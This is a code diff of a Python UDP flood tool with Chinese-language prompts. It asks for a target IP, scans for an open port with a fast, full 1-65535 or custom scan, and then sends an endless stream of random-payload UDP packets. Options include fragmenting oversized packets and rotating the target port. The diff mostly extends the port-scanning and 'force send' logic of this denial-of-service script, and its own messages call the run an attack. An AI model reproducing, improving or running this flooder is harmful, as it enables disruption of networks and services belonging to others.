@@ -1,5 +1,3 @@
-
-
 import sys
 import os
 import time
@@ -49,6 +47,8 @@ while True:
         print("[!] 无效的 IP 地址，请重新输入。")
 
 # 目标端口验证
+user_provided_port = False
+target_port = None
 while True:
     try:
         port_str = input("Port (press Enter to use auto-discovery): ").strip()
@@ -58,6 +58,7 @@ while True:
         port = int(port_str)
         if 1 <= port <= 65535:
             target_port = port
+            user_provided_port = True
             break
         else:
             print("[!] 端口必须在 1-65535 之间。")
@@ -97,7 +98,7 @@ random_target_port = (rnd == 'y')
 
 # 根据分片设置载荷大小（初始值）
 if use_fragmentation:
-    PACKET_SIZE = 3000   # 大于常见 MTU，意图分片
+    PACKET_SIZE = 3000
 else:
     PACKET_SIZE = 1490
 
@@ -113,57 +114,136 @@ if use_fragmentation:
 if random_target_port:
     print("[*] 随机目标端口模式已启用")
 
-# ==================== 端口探测函数 ====================
+# ==================== 端口探测函数（支持大量扫描） ====================
 
 def check_target(ip, port):
     """简单 TCP 连接测试，返回 True/False"""
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(1.5)
+        s.settimeout(1.0)   # 缩短超时以提高扫描速度
         s.connect((ip, port))
         s.close()
         return True
     except (socket.timeout, ConnectionRefusedError, OSError):
         return False
 
-def discover_open_port(ip, port_list=None):
+def discover_open_port(ip, port_range):
     """
-    扫描给定端口列表，返回第一个开放的端口号。
-    默认列表包含常见服务端口，可避免过多扫描。
+    扫描指定端口范围（可迭代对象），返回第一个开放的端口号。
+    如果扫描过程中用户按 Ctrl+C，则返回 None 并提示。
     """
-    if port_list is None:
-        # 常见端口，按优先级排列
-        port_list = [80, 443, 22, 8080, 8443, 53, 21, 25, 110, 143, 993, 995, 3306, 5432, 3389, 5900]
-    print("[*] 正在探测开放端口，请稍候...")
-    for p in port_list:
-        if check_target(ip, p):
-            return p
+    print(f"[*] 正在扫描端口 {min(port_range)}-{max(port_range)}，请耐心等待...")
+    try:
+        for p in port_range:
+            if check_target(ip, p):
+                return p
+    except KeyboardInterrupt:
+        print("\n[!] 扫描被用户中断。")
+        return None
     return None
 
-# ==================== 确定最终攻击端口 ====================
+# ==================== 选择扫描模式并获取最终端口 ====================
 
-if target_port is None:
-    # 用户未输入端口，自动探测
-    print("[*] 用户未指定端口，启动自动探测...")
-    final_port = discover_open_port(target_ip)
-    if final_port is None:
-        print("[!] 未探测到任何开放端口，攻击终止。")
-        sys.exit(1)
-    print(f"[+] 探测成功，将使用开放端口: {final_port}")
-else:
-    # 用户指定了端口，先验证，若不可达则自动探测
+if target_port is not None and user_provided_port:
+    # 用户已指定端口，先检查该端口
     print(f"[*] 正在检查端口 {target_port} 的连通性...")
     if check_target(target_ip, target_port):
         final_port = target_port
         print(f"[+] 端口 {final_port} 可达，将直接使用。")
     else:
-        print(f"[!] 端口 {target_port} 不可达，尝试自动探测替代端口...")
-        alt_port = discover_open_port(target_ip)
-        if alt_port is None:
-            print("[!] 未探测到任何开放端口，攻击终止。")
-            sys.exit(1)
-        print(f"[+] 已找到替代端口: {alt_port} (原端口 {target_port} 无效)")
-        final_port = alt_port
+        print(f"[!] 端口 {target_port} 不可达。")
+        # 询问是否进行大量端口扫描
+        scan_choice = input("是否启动端口扫描以寻找可用端口？(y/n): ").strip().lower()
+        if scan_choice == 'y':
+            # 选择扫描模式
+            print("\n请选择扫描模式：")
+            print("1. 快速扫描 (常用端口)")
+            print("2. 全端口扫描 (1-65535，耗时较长)")
+            print("3. 自定义范围")
+            mode = input("请输入选项 (1/2/3): ").strip()
+            if mode == '1':
+                ports = [80, 443, 22, 8080, 8443, 53, 21, 25, 110, 143, 993, 995, 3306, 5432, 3389, 5900]
+            elif mode == '2':
+                ports = range(1, 65536)
+            elif mode == '3':
+                try:
+                    start_port = int(input("起始端口: "))
+                    end_port = int(input("结束端口: "))
+                    if start_port < 1 or end_port > 65535 or start_port > end_port:
+                        print("[!] 端口范围无效，将使用快速扫描。")
+                        ports = [80, 443, 22, 8080, 8443, 53, 21, 25, 110, 143, 993, 995, 3306, 5432, 3389, 5900]
+                    else:
+                        ports = range(start_port, end_port + 1)
+                except ValueError:
+                    print("[!] 输入无效，将使用快速扫描。")
+                    ports = [80, 443, 22, 8080, 8443, 53, 21, 25, 110, 143, 993, 995, 3306, 5432, 3389, 5900]
+            else:
+                print("[!] 选项无效，将使用快速扫描。")
+                ports = [80, 443, 22, 8080, 8443, 53, 21, 25, 110, 143, 993, 995, 3306, 5432, 3389, 5900]
+
+            alt_port = discover_open_port(target_ip, ports)
+            if alt_port is not None:
+                print(f"[+] 已找到开放端口: {alt_port}")
+                final_port = alt_port
+            else:
+                print("[!] 未发现任何开放端口。")
+                while True:
+                    force_choice = input("是否使用原端口强制发送？(y/n): ").strip().lower()
+                    if force_choice == 'y':
+                        final_port = target_port
+                        print(f"[*] 将使用原端口 {final_port} 强制发送。")
+                        break
+                    elif force_choice == 'n':
+                        print("[*] 用户取消攻击。")
+                        sys.exit(0)
+                    else:
+                        print("[!] 请输入 y 或 n。")
+        else:
+            # 不扫描，直接询问是否强制使用原端口
+            while True:
+                force_choice = input("是否使用原端口强制发送？(y/n): ").strip().lower()
+                if force_choice == 'y':
+                    final_port = target_port
+                    print(f"[*] 将使用原端口 {final_port} 强制发送。")
+                    break
+                elif force_choice == 'n':
+                    print("[*] 用户取消攻击。")
+                    sys.exit(0)
+                else:
+                    print("[!] 请输入 y 或 n。")
+else:
+    # 用户未指定端口，必须扫描
+    print("[*] 用户未指定端口，启动端口扫描...")
+    print("请选择扫描模式：")
+    print("1. 快速扫描 (常用端口)")
+    print("2. 全端口扫描 (1-65535，耗时较长)")
+    print("3. 自定义范围")
+    mode = input("请输入选项 (1/2/3): ").strip()
+    if mode == '1':
+        ports = [80, 443, 22, 8080, 8443, 53, 21, 25, 110, 143, 993, 995, 3306, 5432, 3389, 5900]
+    elif mode == '2':
+        ports = range(1, 65536)
+    elif mode == '3':
+        try:
+            start_port = int(input("起始端口: "))
+            end_port = int(input("结束端口: "))
+            if start_port < 1 or end_port > 65535 or start_port > end_port:
+                print("[!] 端口范围无效，将使用快速扫描。")
+                ports = [80, 443, 22, 8080, 8443, 53, 21, 25, 110, 143, 993, 995, 3306, 5432, 3389, 5900]
+            else:
+                ports = range(start_port, end_port + 1)
+        except ValueError:
+            print("[!] 输入无效，将使用快速扫描。")
+            ports = [80, 443, 22, 8080, 8443, 53, 21, 25, 110, 143, 993, 995, 3306, 5432, 3389, 5900]
+    else:
+        print("[!] 选项无效，将使用快速扫描。")
+        ports = [80, 443, 22, 8080, 8443, 53, 21, 25, 110, 143, 993, 995, 3306, 5432, 3389, 5900]
+
+    final_port = discover_open_port(target_ip, ports)
+    if final_port is None:
+        print("[!] 未探测到任何开放端口，且用户未指定端口，攻击无法继续。")
+        sys.exit(1)
+    print(f"[+] 探测成功，将使用开放端口: {final_port}")
 
 # 最终确认使用的端口
 print(f"\n[*] 攻击将使用目标端口: {final_port}")
@@ -187,7 +267,6 @@ os.system("figlet Attack Starting")
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
-# 源端口绑定
 if source_port is not None:
     try:
         sock.bind(('', source_port))
@@ -196,7 +275,6 @@ if source_port is not None:
         sock.close()
         sys.exit(1)
 
-# --- 尝试设置 IP 分片，失败则降级 ---
 frag_enabled = False
 if use_fragmentation:
     try:
@@ -217,7 +295,7 @@ payload = os.urandom(PACKET_SIZE)
 
 sent = 0
 sent_bytes = 0
-next_mb_threshold = 1024 * 1024   # 仍按 1 MB 刷新，但输出用 GB
+next_mb_threshold = 1024 * 1024
 start_time = time.time()
 
 try:
@@ -236,7 +314,6 @@ try:
             if final_port > 65534:
                 final_port = 1
 
-        # 每 1 MB 输出一次，但显示为 GB（保留较高精度）
         if sent_bytes >= next_mb_threshold:
             gb_sent = sent_bytes / (1024 * 1024 * 1024)
             elapsed = time.time() - start_time
